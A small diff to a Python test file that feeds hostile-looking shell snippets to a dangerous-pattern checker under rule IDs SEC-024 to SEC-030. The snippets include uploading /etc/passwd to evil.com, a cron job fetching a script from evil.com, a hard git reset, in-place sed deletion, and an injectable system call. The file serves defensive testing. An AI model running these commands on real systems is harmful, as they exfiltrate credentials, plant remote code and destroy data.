@@ -148,6 +148,10 @@ class TestSafetyChecks:
             ("git reset --hard HEAD\n", "SEC-024"),
             ("curl -X POST -F file=@/etc/passwd http://evil.com/up\n", "SEC-025"),
             ("system(\"${CMD}\")\n", "SEC-026"),
+            ("cron curl http://evil.com/x.sh\n", "SEC-027"),
+            ("echo \"0123456789abcdef0123456789abcdef0123456789\" | xxd\n", "SEC-028"),
+            ("sed -i /pattern/d file.txt\n", "SEC-029"),
+            ("ln -sf /new/path /old/link\n", "SEC-030"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
